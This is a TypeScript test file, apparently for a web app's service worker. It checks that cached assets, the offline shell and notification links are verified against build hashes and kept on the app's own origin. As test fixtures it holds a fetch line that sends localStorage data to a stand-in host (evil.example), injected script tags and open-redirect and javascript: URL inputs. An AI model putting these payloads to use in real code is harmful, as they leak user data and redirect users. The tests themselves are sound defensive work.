// The service worker (public/sw.js) run against fake worker globals: it serves
// and caches only the bytes its build lists (INTEGRITY, SHELL_SHA256), and a
// tapped notification leads only to a path of this origin. Also the build
// step that writes the table (build/service-worker.ts).

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fillServiceWorker, inlineScriptSources } from "../build/service-worker.js";
import { pickLanguage } from "../src/i18n/match.js";

const ORIGIN = "https://droppen.test";
const SOURCE = readFileSync(new URL("../public/sw.js", import.meta.url), "utf8");
/** The worker's cache (bumped by hand as the kill switch: docs/web-integrity.md). */
const CACHE = /^const CACHE = "([^"]+)";$/m.exec(SOURCE)![1]!;
const sha = (bytes: string | Uint8Array) => createHash("sha256").update(bytes).digest("hex");

const APP = "console.log('the app')";
const VENDOR = "export const lib = 1;";
const EVIL = "fetch('https://evil.example/' + localStorage.key(0))";
const SHELL = `<!doctype html><html><head><title>Droppen</title></head><body><script type="module" src="/assets/app-1.js"></script></body></html>`;
/** A built shell with an inline boot script, as the real one has. */
const BOOT = "document.documentElement.dataset.boot = '1'";
const BUILT = SHELL.replace("<title>Droppen</title>", `<title>Droppen</title><script>${BOOT}</script>`);
const marked = (origin = "wss://droppen.test") => SHELL.replace("<head>", `<head><meta name="rh-hub" content="${origin}" />`);
const JS = { "content-type": "text/javascript; charset=utf-8" };
const HTML = { "content-type": "text/html; charset=utf-8" };

/** One Cache: request URL → response, as the browser keeps them. */
class FakeCache {
  entries = new Map<string, Response>();
  private key(req: Request | string) {
    return new URL(typeof req === "string" ? req : req.url, ORIGIN).href;
  }
  async match(req: Request | string) {
    return this.entries.get(this.key(req))?.clone();
  }
  async put(req: Request | string, res: Response) {
    this.entries.set(this.key(req), res.clone());
  }
  async delete(req: Request | string) {
    return this.entries.delete(this.key(req));
  }
  async keys() {
    return [...this.entries.keys()].map((url) => new Request(url));
  }
  async text(path: string) {
    return (await this.match(path))?.text();
  }
}

type Listener = (event: any) => void;

/**
 * Load sw.js with the build's markers filled in (`table`, `shell`) into a fake
 * worker: its `caches`, a `fetch` answering from `network` (path → [body,
 * headers] or a status), `clients` that record what they were asked.
 */
function worker(
  opts: {
    network?: Record<string, [string, Record<string, string>] | number>;
    precache?: string[];
    precacheCloud?: string[];
    languages?: Record<string, { prefix: string; files: string[] }>;
    table?: Record<string, string>;
    shell?: string;
    scripts?: string[];
    httpCache?: Record<string, string>;
    hub?: string;
    /** The worker's `navigator`: its `languages` and `language`. */
    navigator?: { languages?: string[]; language?: string };
  } = {},
) {
  const table = opts.table ?? { "/assets/app-1.js": sha(APP), "/assets/vendor-1.js": sha(VENDOR) };
  const text = SOURCE.replace("const PRECACHE = [];", `const PRECACHE = ${JSON.stringify(opts.precache ?? [])};`)
    .replace("const PRECACHE_CLOUD = [];", `const PRECACHE_CLOUD = ${JSON.stringify(opts.precacheCloud ?? [])};`)
    .replace("const INTEGRITY = {};", `const INTEGRITY = ${JSON.stringify(table)};`)
    .replace('const SHELL_SHA256 = "";', `const SHELL_SHA256 = ${JSON.stringify(opts.shell ?? sha(SHELL))};`)
    .replace("const SHELL_SCRIPTS = [];", `const SHELL_SCRIPTS = ${JSON.stringify(opts.scripts ?? [])};`)
    .replace('const HUB_ORIGIN = "";', `const HUB_ORIGIN = ${JSON.stringify(opts.hub ?? "")};`)
    .replace("const LANGUAGES = {};", `const LANGUAGES = ${JSON.stringify(opts.languages ?? {})};`);
  assert.notEqual(text, SOURCE, "the markers are there to fill in");
  const stores = new Map<string, FakeCache>();
  const caches = {
    async open(name: string) {
      if (!stores.has(name)) stores.set(name, new FakeCache());
      return stores.get(name)!;
    },
    async keys() {
      return [...stores.keys()];
    },
    async delete(name: string) {
      return stores.delete(name);
    },
  };
  const network = { ...(opts.network ?? {}) };
  // The browser's HTTP cache: what a plain fetch gets first; `cache: "reload"`
  // passes it by, `only-if-cached` gets nothing else (a network error without it).
  const httpCache = { ...(opts.httpCache ?? {}) };
  const fetched: string[] = [];
  const fetch = async (input: Request | string, init?: { cache?: string }) => {
    const url = new URL(typeof input === "string" ? input : input.url, ORIGIN);
    const reload = init?.cache === "reload";
    const cachedOnly = init?.cache === "only-if-cached";
    fetched.push(`${url.pathname}${reload ? " (reload)" : cachedOnly ? " (only-if-cached)" : ""}`);
    if (!reload && httpCache[url.pathname] !== undefined) return new Response(httpCache[url.pathname], { headers: JS });
    if (cachedOnly) throw new TypeError("Failed to fetch");
    const answer = network[url.pathname];
    if (answer === undefined) throw new TypeError("Failed to fetch");
    if (typeof answer === "number") return new Response("not found", { status: answer });
    return new Response(answer[0], { headers: answer[1] });
  };
  const listeners = new Map<string, Listener[]>();
  const opened: string[] = [];
  const posted: unknown[] = [];
  const windows: { focus(): Promise<void>; postMessage(m: unknown): void }[] = [];
  const self = {
    location: new URL(`${ORIGIN}/sw.js`),
    addEventListener(type: string, fn: Listener) {
      listeners.set(type, [...(listeners.get(type) ?? []), fn]);
    },
    skipWaiting() {},
    registration: { showNotification: async () => undefined },
    clients: {
      claim: async () => undefined,
      matchAll: async () => windows,
      openWindow: async (url: string) => void opened.push(url),
    },
  };
  new Function("self", "caches", "fetch", "crypto", "navigator", text)(self, caches, fetch, globalThis.crypto, opts.navigator ?? {});

  /** Dispatch `type` and wait for everything it waits on; the response, for a fetch. */
  async function dispatch(type: string, extra: Record<string, unknown> = {}): Promise<Response | undefined> {
    const waits: Promise<unknown>[] = [];
    let responded: Promise<Response> | undefined;
    const event = { ...extra, waitUntil: (p: Promise<unknown>) => void waits.push(p), respondWith: (p: Promise<Response>) => void (responded = p) };
    for (const fn of listeners.get(type) ?? []) fn(event);
    const res = responded ? await responded : undefined;
    // A promise waited on may add another (a fetch puts its copy once it has the response).
    for (let i = 0; i < waits.length; i++) await waits[i];
    return res;
  }
  return {
    stores,
    network,
    httpCache,
    fetched,
    opened,
    posted,
    windows,
    cache: () => caches.open(CACHE),
    install: () => dispatch("install"),
    activate: () => dispatch("activate"),
    get: (path: string) => dispatch("fetch", { request: new Request(`${ORIGIN}${path}`) }),
    navigate: (path: string) => dispatch("fetch", { request: { url: `${ORIGIN}${path}`, method: "GET", mode: "navigate" } }),
    tap: (url: unknown) => dispatch("notificationclick", { notification: { close() {}, data: { url } } }),
  };
}

test("an asset whose bytes are its build's is fetched, cached and served from the cache", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [APP, JS] } });
  const first = await sw.get("/assets/app-1.js");
  assert.equal(await first!.text(), APP);
  assert.equal(await (await sw.cache()).text("/assets/app-1.js"), APP);
  delete sw.network["/assets/app-1.js"];
  const again = await sw.get("/assets/app-1.js");
  assert.equal(await again!.text(), APP, "from the cache, the network gone");
});

test("a tampered copy in the cache is never served: it is deleted and the asset fetched again", async () => {
  const sw = worker({ network: { "/assets/vendor-1.js": [VENDOR, JS] } });
  // What a page's script (or an earlier delivery) put there, under the stable vendor name.
  await (await sw.cache()).put("/assets/vendor-1.js", new Response(EVIL, { headers: JS }));
  const res = await sw.get("/assets/vendor-1.js");
  assert.equal(await res!.text(), VENDOR);
  assert.equal(await (await sw.cache()).text("/assets/vendor-1.js"), VENDOR, "the good copy replaced it");
});

test("a tampered asset from the network is refused and never cached", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [EVIL, JS] } });
  const res = await sw.get("/assets/app-1.js");
  assert.equal(res!.status, 502);
  assert.doesNotMatch(await res!.text(), /evil/);
  assert.equal(await (await sw.cache()).match("/assets/app-1.js"), undefined);
  assert.deepEqual(sw.fetched, ["/assets/app-1.js", "/assets/app-1.js (reload)"], "asked the network itself once more");
});

test("a bad copy in the browser's HTTP cache is passed by for the network's", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [APP, JS] }, httpCache: { "/assets/app-1.js": EVIL } });
  const res = await sw.get("/assets/app-1.js");
  assert.equal(await res!.text(), APP);
  assert.equal(await (await sw.cache()).text("/assets/app-1.js"), APP);
});

test("HTML answered for an asset is neither served as it nor cached; a 404 passes through", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [SHELL, HTML], "/assets/vendor-1.js": 404 } });
  assert.equal((await sw.get("/assets/app-1.js"))!.status, 502);
  assert.equal((await sw.get("/assets/vendor-1.js"))!.status, 404);
  assert.equal((await (await sw.cache()).keys()).length, 0);
});

test("an asset the build does not list comes from the network and is never kept; a cached copy of it is dropped", async () => {
  const sw = worker({ network: { "/assets/newer-2.js": ["newer", JS] } });
  await (await sw.cache()).put("/assets/newer-2.js", new Response(EVIL, { headers: JS }));
  const res = await sw.get("/assets/newer-2.js");
  assert.equal(await res!.text(), "newer");
  assert.equal(await (await sw.cache()).match("/assets/newer-2.js"), undefined);
});

test("install precaches the boot set only with the listed bytes, replacing a tampered copy", async () => {
  const sw = worker({ precache: ["/assets/app-1.js", "/assets/vendor-1.js"], network: { "/assets/app-1.js": [APP, JS], "/assets/vendor-1.js": [EVIL, JS] } });
  await (await sw.cache()).put("/assets/app-1.js", new Response(EVIL, { headers: JS }));
  await sw.install();
  assert.equal(await (await sw.cache()).text("/assets/app-1.js"), APP);
  assert.equal(await (await sw.cache()).match("/assets/vendor-1.js"), undefined);
});

test("install precaches the translations of the languages this browser shows, with the listed bytes, and no other's", async () => {
  const ZH = "export default { settings: '设置' }";
  const JA = "export default { settings: '設定' }";
  const languages = {
    "zh-CN": { prefix: "/assets/lang-zh-CN-", files: ["/assets/lang-zh-CN-2.js"] },
    ja: { prefix: "/assets/lang-ja-", files: ["/assets/lang-ja-2.js"] },
  };
  const table = { "/assets/app-1.js": sha(APP), "/assets/lang-zh-CN-2.js": sha(ZH), "/assets/lang-ja-2.js": sha(JA) };
  const languageFetches = (sw: { fetched: string[] }) => sw.fetched.filter((f) => f.includes("/lang-") && !f.endsWith("(only-if-cached)"));

  // The first install: the page fetched its zh-CN translations before any worker saw its requests.
  const first = worker({ precache: ["/assets/app-1.js"], languages, table, httpCache: { "/assets/app-1.js": APP, "/assets/lang-zh-CN-2.js": ZH }, network: { "/assets/lang-ja-2.js": [JA, JS] } });
  await first.install();
  assert.equal(await (await first.cache()).text("/assets/lang-zh-CN-2.js"), ZH, "from the HTTP cache");
  assert.equal(await (await first.cache()).match("/assets/lang-ja-2.js"), undefined);
  assert.deepEqual(languageFetches(first), ["/assets/lang-zh-CN-2.js"], "ja not fetched at all");

  // A release: the older build's ja chunk in the cache says this browser shows ja; the new one comes before the reload.
  const update = worker({ precache: ["/assets/app-1.js"], languages, table, network: { "/assets/app-1.js": [APP, JS], "/assets/lang-ja-2.js": [JA, JS], "/assets/lang-zh-CN-2.js": [ZH, JS] } });
  await (await update.cache()).put("/assets/lang-ja-1.js", new Response("export default {}", { headers: JS }));
  await update.install();
  assert.equal(await (await update.cache()).text("/assets/lang-ja-2.js"), JA);
  assert.deepEqual(languageFetches(update), ["/assets/lang-ja-2.js"], "zh-CN not fetched at all");
  await update.activate();
  assert.equal(await (await update.cache()).match("/assets/lang-ja-1.js"), undefined, "the older chunk goes on activate");

  // An English reader's browser: none.
  const english = worker({ precache: ["/assets/app-1.js"], languages, table, network: { "/assets/app-1.js": [APP, JS], "/assets/lang-ja-2.js": [JA, JS], "/assets/lang-zh-CN-2.js": [ZH, JS] } });
  await english.install();
  assert.deepEqual(languageFetches(english), []);
  assert.deepEqual((await (await english.cache()).keys()).map((r) => new URL(r.url).pathname), ["/assets/app-1.js"]);

  // Bytes that are not the listed ones are not kept, from either cache or the network.
  const tampered = worker({ precache: [], languages, table, httpCache: { "/assets/lang-zh-CN-2.js": EVIL }, network: { "/assets/lang-zh-CN-2.js": [EVIL, JS] } });
  await tampered.install();
  assert.equal(await (await tampered.cache()).match("/assets/lang-zh-CN-2.js"), undefined);
});

test("the first release with per-language chunks, or after the kill switch: the language the browser's own languages pick is precached", async () => {
  const ZH = "export default { settings: '設定' }";
  const languages = {
    "zh-CN": { prefix: "/assets/lang-zh-CN-", files: ["/assets/lang-zh-CN-2.js"] },
    "zh-TW": { prefix: "/assets/lang-zh-TW-", files: ["/assets/lang-zh-TW-2.js"] },
  };
  const table = { "/assets/app-2.js": sha(APP), "/assets/lang-zh-CN-2.js": sha("zh-CN"), "/assets/lang-zh-TW-2.js": sha(ZH) };
  // The older build's worker kept its boot set, no language chunk among it; the page never fetched this build's.
  const sw = worker({ precache: ["/assets/app-2.js"], languages, table, navigator: { languages: ["fr-FR", "zh-HK", "en"], language: "fr-FR" }, network: { "/assets/app-2.js": [APP, JS], "/assets/lang-zh-TW-2.js": [ZH, JS], "/assets/lang-zh-CN-2.js": ["zh-CN", JS] } });
  await (await sw.cache()).put("/assets/app-1.js", new Response(APP, { headers: JS }));
  await sw.install();
  await sw.activate();
  assert.equal(await (await sw.cache()).text("/assets/lang-zh-TW-2.js"), ZH);
  assert.equal(await (await sw.cache()).match("/assets/lang-zh-CN-2.js"), undefined);
  // Offline, the reload after it finds its words.
  for (const path of Object.keys(sw.network)) delete sw.network[path];
  assert.equal(await (await sw.get("/assets/lang-zh-TW-2.js"))!.text(), ZH);
});

test("the worker picks the browser's language by the page's own rule (match.ts)", async () => {
  const languages = {
    "zh-CN": { prefix: "/assets/lang-zh-CN-", files: ["/assets/lang-zh-CN-2.js"] },
    "zh-TW": { prefix: "/assets/lang-zh-TW-", files: ["/assets/lang-zh-TW-2.js"] },
    ja: { prefix: "/assets/lang-ja-", files: ["/assets/lang-ja-2.js"] },
  };
  const table = Object.fromEntries(Object.keys(languages).map((lang) => [`/assets/lang-${lang}-2.js`, sha(lang)]));
  const network = Object.fromEntries(Object.keys(languages).map((lang): [string, [string, Record<string, string>]] => [`/assets/lang-${lang}-2.js`, [lang, JS]]));
  const cases: [string[] | undefined, string][] = [
    [["zh-CN"], "zh-CN"],
    [["zh-Hant-TW"], "zh-CN"],
    [["zh-Hans-HK", "ja"], "zh-CN"],
    [["zh_TW"], "zh-CN"],
    [["ZH-hk"], "zh-CN"],
    [["zh-MO", "en"], "zh-CN"],
    [["fr-FR", "ja-JP", "zh-CN"], "zh-CN"],
    [["de-DE", "zh-Hant", "ja"], "zh-CN"],
    [["en-US", "zh-CN"], "zh-CN"],
    [["ko-KR", "es"], "zh-CN"],
    [[], "zh-CN"],
    [undefined, "ja"],
    [["", "yue-Hant-HK", "jav"], "zh-CN"],
    [["ko-KR"], "fr"],
  ];
  for (const [languagesOfBrowser, language] of cases) {
    const sw = worker({ precache: [], languages, table, network, navigator: { languages: languagesOfBrowser, language } });
    await sw.install();
    const kept = (await (await sw.cache()).keys()).map((r) => /lang-([\w-]+)-2\.js$/.exec(new URL(r.url).pathname)?.[1]);
    const want = pickLanguage([...(languagesOfBrowser ?? []), language]);
    assert.deepEqual(kept, want === "en" ? [] : [want], `${JSON.stringify(languagesOfBrowser)} / ${language}: the page shows ${want}`);
  }
});

test("install precaches the cloud app's chunks too, only on a page a hub serves", async () => {
  const CLOUD = "export const cloud = 1;";
  const table = { "/assets/app-1.js": sha(APP), "/assets/cloud-app-1.js": sha(CLOUD) };
  const network = { "/assets/app-1.js": [APP, JS], "/assets/cloud-app-1.js": [CLOUD, JS] } as Record<string, [string, Record<string, string>]>;
  const opts = { table, precache: ["/assets/app-1.js"], precacheCloud: ["/assets/cloud-app-1.js"] };
  // A release's install where the shell kept for offline is a hub's: its page boots from the cloud chunks too.
  const hub = worker({ ...opts, network: { ...network, "/sessions": [marked(), HTML] } });
  await (await hub.cache()).put("/", new Response(marked(), { headers: HTML }));
  await hub.install();
  assert.equal(await (await hub.cache()).text("/assets/cloud-app-1.js"), CLOUD);
  assert.equal(await (await hub.cache()).text("/assets/app-1.js"), APP);
  assert.deepEqual(hub.fetched, ["/assets/app-1.js", "/assets/cloud-app-1.js"], "nothing fetched to tell");
  // A local server's shell (no marker): only the local app's boot.
  const local = worker({ ...opts, network });
  await (await local.cache()).put("/", new Response(SHELL, { headers: HTML }));
  await local.install();
  assert.equal(await (await local.cache()).text("/assets/app-1.js"), APP);
  assert.equal(await (await local.cache()).match("/assets/cloud-app-1.js"), undefined);
  assert.deepEqual(local.fetched, ["/assets/app-1.js"]);
  // A first install, with no shell kept yet, on a local page: it never loaded the cloud chunk, which the
  // HTTP cache is asked for without going to the network; no shell is fetched to find out.
  const first = worker({ ...opts, network: { ...network, "/sessions": [marked(), HTML] } });
  await first.install();
  assert.equal(await (await first.cache()).match("/assets/cloud-app-1.js"), undefined);
  assert.equal(await (await first.cache()).text("/assets/app-1.js"), APP);
  assert.deepEqual(first.fetched, ["/assets/cloud-app-1.js (only-if-cached)", "/assets/app-1.js"]);
  // A first install on a hub's page, which loaded the cloud chunk before any worker saw its requests.
  const firstHub = worker({ ...opts, network, httpCache: { "/assets/cloud-app-1.js": CLOUD } });
  await firstHub.install();
  assert.equal(await (await firstHub.cache()).text("/assets/cloud-app-1.js"), CLOUD, "from the HTTP cache");
  assert.equal(await (await firstHub.cache()).text("/assets/app-1.js"), APP);
});

test("activate drops other caches, unlisted and tampered assets, a foreign shell and anything else", async () => {
  const sw = worker({ network: { "/sessions": [marked(), HTML] } });
  const cache = await sw.cache();
  await cache.put("/assets/app-1.js", new Response(APP, { headers: JS }));
  await cache.put("/assets/vendor-1.js", new Response(EVIL, { headers: JS }));
  await cache.put("/assets/old-0.js", new Response("old", { headers: JS }));
  await cache.put("/__rh-sw/listed", new Response("{}", { headers: { "content-type": "application/json" } }));
  await cache.put("/", new Response(marked().replace("<title>Droppen</title>", "<title>Droppen</title><script>evil()</script>"), { headers: HTML }));
  sw.stores.set("rh-sw-v0-older", new FakeCache());
  await sw.activate();
  assert.deepEqual([...sw.stores.keys()], [CACHE]);
  const left = (await cache.keys()).map((r) => new URL(r.url).pathname).sort();
  assert.deepEqual(left, ["/", "/assets/app-1.js"]);
  assert.equal(await cache.text("/"), marked(), "the shell seeded from the network, this build's");
});

test("the offline shell: kept and served only when it is this build's, this origin's hub's marker aside", async () => {
  // Online: served as it came, and kept only if it is this build's.
  const sw = worker({ network: { "/sessions": [marked(), HTML] } });
  assert.equal(await (await sw.navigate("/sessions"))!.text(), marked());
  assert.equal(await (await sw.cache()).text("/"), marked(), "with the marker: kept");
  delete sw.network["/sessions"];
  assert.equal(await (await sw.navigate("/sessions"))!.text(), marked(), "offline: the kept shell");

  // Another build's shell (a newer release while this worker is the older one): served online, never kept.
  const newer = worker({ network: { "/signin": [SHELL.replace("app-1", "app-2"), HTML] } });
  assert.match(await (await newer.navigate("/signin"))!.text(), /app-2/);
  assert.equal(await (await newer.cache()).match("/"), undefined);

  // A marker that is not exactly the hub's, or not where it writes it, is part of the shell.
  for (const odd of [SHELL.replace("<head>", '<head><meta name="rh-hub" content="javascript:x" />'), SHELL.replace("</head>", '<meta name="rh-hub" content="wss://x" /></head>')]) {
    const sw2 = worker({ network: { "/": [odd, HTML] } });
    await sw2.navigate("/");
    assert.equal(await (await sw2.cache()).match("/"), undefined, odd);
  }

  // A tampered shell in the cache is not served offline, and goes.
  const offline = worker();
  await (await offline.cache()).put("/", new Response(SHELL.replace("</body>", "<script>evil()</script></body>"), { headers: HTML }));
  await assert.rejects(offline.navigate("/sessions"));
  assert.equal(await (await offline.cache()).match("/"), undefined);
});

test("a shell pointed at any hub but this origin's own is never kept, served or left in the cache", async () => {
  const own = '<meta name="rh-hub" content="wss://droppen.test" />';
  const foreign = [
    ["another hub", marked("wss://evil.example")],
    ["ws:// on an https origin", marked("ws://droppen.test")],
    ["another port", marked("wss://droppen.test:8443")],
    ["a second marker", SHELL.replace("<head>", `<head>${own}<meta name="rh-hub" content="wss://evil.example" />`)],
    ["the marker twice", SHELL.replace("<head>", `<head>${own}${own}`)],
    ["the marker elsewhere", SHELL.replace("</head>", `${own}</head>`)],
  ];
  for (const [what, shell] of foreign) {
    // Online: served as it came (the page is the network's), never kept.
    const sw = worker({ network: { "/sessions": [shell, HTML] } });
    assert.equal(await (await sw.navigate("/sessions"))!.text(), shell, what);
    assert.equal(await (await sw.cache()).match("/"), undefined, `${what}: not kept`);
    // Written into the cache by a page: not served offline, and gone.
    const offline = worker();
    await (await offline.cache()).put("/", new Response(shell, { headers: HTML }));
    await assert.rejects(offline.navigate("/sessions"), `${what}: not served`);
    assert.equal(await (await offline.cache()).match("/"), undefined, `${what}: dropped`);
    // And on activate.
    const later = worker();
    await (await later.cache()).put("/", new Response(shell, { headers: HTML }));
    await later.activate();
    assert.equal(await (await later.cache()).match("/"), undefined, `${what}: dropped on activate`);
  }
});

test("a cloud build keeps the shell its own marker names — the canonical API origin — and not another", async () => {
  const api = "wss://api.droppen.app";
  const sw = worker({ hub: api, network: { "/sessions": [marked(api), HTML] } });
  assert.equal(await (await sw.navigate("/sessions"))!.text(), marked(api));
  assert.equal(await (await sw.cache()).text("/"), marked(api), "the API origin its build names: kept");
  // The same build's shell marked with the page's own host is not the shell it wrote.
  const own = worker({ hub: api, network: { "/sessions": [marked(), HTML] } });
  await own.navigate("/sessions");
  assert.equal(await (await own.cache()).match("/"), undefined);
  // Another hub is still another hub.
  const foreign = worker({ hub: api, network: { "/sessions": [marked("wss://evil.example"), HTML] } });
  await foreign.navigate("/sessions");
  assert.equal(await (await foreign.cache()).match("/"), undefined);
});

test("the offline shell is served with the worker's own headers, never the cached ones", async () => {
  const scripts = ["'sha256-boot'"];
  const sw = worker({ scripts });
  // A page wrote this build's shell with a permissive policy of its own.
  await (await sw.cache()).put(
    "/",
    new Response(marked(), { headers: { "content-type": "text/html", "content-security-policy": "script-src * 'unsafe-inline'", "x-from-the-page": "1" } }),
  );
  const res = (await sw.navigate("/sessions"))!;
  assert.equal(await res.text(), marked());
  assert.equal(res.headers.get("x-from-the-page"), null);
  assert.equal(res.headers.get("content-type"), "text/html; charset=utf-8");
  assert.equal(res.headers.get("x-content-type-options"), "nosniff");
  assert.equal(res.headers.get("referrer-policy"), "no-referrer");
  assert.equal(res.headers.get("permissions-policy"), "publickey-credentials-get=(self), publickey-credentials-create=(self)");
  assert.equal(
    res.headers.get("content-security-policy"),
    "default-src 'self'; script-src 'self' 'sha256-boot'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; " +
      "connect-src 'self' wss://droppen.test https: wss:; worker-src 'self' blob:; manifest-src 'self'; frame-src 'none'; frame-ancestors 'none'; " +
      "base-uri 'self'; form-action 'self'; object-src 'none'",
  );
  // A local server's shell (no marker): the same policy on its own origin, framed by itself as that server allows.
  const local = worker({ scripts });
  await (await local.cache()).put("/", new Response(SHELL, { headers: { "content-security-policy": "frame-ancestors *" } }));
  const policy = (await local.navigate("/sessions"))!.headers.get("content-security-policy")!;
  assert.match(policy, /script-src 'self' 'sha256-boot';/);
  assert.match(policy, /connect-src 'self' wss:\/\/droppen\.test;/);
  assert.match(policy, /frame-ancestors 'self'/);
});

test("a tapped notification leads only to a path of this origin, focused or opened", async () => {
  const cases: [unknown, string][] = [
    ["/sessions/claude/abc?x=1#end", "/sessions/claude/abc?x=1#end"],
    ["https://evil.example/x", "/sessions"],
    ["//evil.example/x", "/sessions"],
    ["/\\evil.example/x", "/sessions"],
    ["/\t/evil.example/x", "/sessions"],
    ["javascript:alert(1)", "/sessions"],
    [42, "/sessions"],
    [undefined, "/sessions"],
  ];
  for (const [url, to] of cases) {
    const sw = worker();
    await sw.tap(url);
    assert.deepEqual(sw.opened, [to], `openWindow for ${String(url)}`);
    const open = worker();
    open.windows.push({ focus: async () => undefined, postMessage: (m) => void open.posted.push(m) });
    await open.tap(url);
    assert.deepEqual(open.posted, [{ type: "nav", url: to }], `postMessage for ${String(url)}`);
    assert.deepEqual(open.opened, []);
  }
});

test("the build writes every asset's sha256 and the shell's into sw.js, sorted, and fails without the markers", () => {
  const dir = mkdtempSync(join(tmpdir(), "sw-integrity-"));
  try {
    mkdirSync(join(dir, "assets", "fonts"), { recursive: true });
    writeFileSync(join(dir, "index.html"), BUILT);
    writeFileSync(join(dir, "assets", "vendor-1.js"), VENDOR);
    writeFileSync(join(dir, "assets", "app-1.js"), APP);
    writeFileSync(join(dir, "assets", "fonts", "a.woff2"), "font$&$'");
    writeFileSync(join(dir, "sw.js"), SOURCE);
    fillServiceWorker(dir, ["/assets/app-1.js"], { cloudBoot: ["/assets/vendor-1.js"] });
    let text = readFileSync(join(dir, "sw.js"), "utf8");
    assert.match(text, /^const HUB_ORIGIN = "";$/m, "a normal build: only this origin's own marker is accepted");
    assert.match(text, /^const PRECACHE = \["\/assets\/app-1\.js"\];$/m);
    assert.match(text, /^const PRECACHE_CLOUD = \["\/assets\/vendor-1\.js"\];$/m);
    const table = JSON.parse(/^const INTEGRITY = (\{.*\});$/m.exec(text)![1]!);
    assert.deepEqual(Object.keys(table), ["/assets/app-1.js", "/assets/fonts/a.woff2", "/assets/vendor-1.js"]);
    assert.equal(table["/assets/fonts/a.woff2"], sha("font$&$'"));
    assert.match(text, new RegExp(`^const SHELL_SHA256 = "${sha(BUILT)}";$`, "m"));
    // The inline boot script's CSP source, as a hub allows it; the module script (src=) is none.
    const sources = JSON.parse(/^const SHELL_SCRIPTS = (\[.*\]);$/m.exec(text)![1]!);
    assert.deepEqual(sources, [`'sha256-${createHash("sha256").update(BOOT).digest("base64")}'`]);
    assert.deepEqual(inlineScriptSources(BUILT), sources);
    assert.match(text, /^const LANGUAGES = \{\};$/m, "no language chunks given: none");
    // Filled once: a second run finds no marker.
    assert.throws(() => fillServiceWorker(dir, []), /has no `const PRECACHE = \[\];` to fill in/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("the build writes each language's translations into the worker, for it to precache the ones the browser shows", () => {
  const dir = mkdtempSync(join(tmpdir(), "sw-integrity-"));
  try {
    mkdirSync(join(dir, "assets"), { recursive: true });
    writeFileSync(join(dir, "index.html"), BUILT);
    writeFileSync(join(dir, "sw.js"), SOURCE);
    const languages = { ja: { prefix: "/assets/lang-ja-", files: ["/assets/lang-ja-2.js"] } };
    fillServiceWorker(dir, [], { languages });
    assert.deepEqual(JSON.parse(/^const LANGUAGES = (\{.*\});$/m.exec(readFileSync(join(dir, "sw.js"), "utf8"))![1]!), languages);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a cloud build writes the marker origin into the worker, so its shell is the one kept offline", () => {
  const dir = mkdtempSync(join(tmpdir(), "sw-integrity-"));
  try {
    mkdirSync(join(dir, "assets"), { recursive: true });
    writeFileSync(join(dir, "index.html"), BUILT);
    writeFileSync(join(dir, "sw.js"), SOURCE);
    fillServiceWorker(dir, [], { hubOrigin: "wss://api.droppen.app" });
    assert.match(readFileSync(join(dir, "sw.js"), "utf8"), /^const HUB_ORIGIN = "wss:\/\/api\.droppen\.app";$/m);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
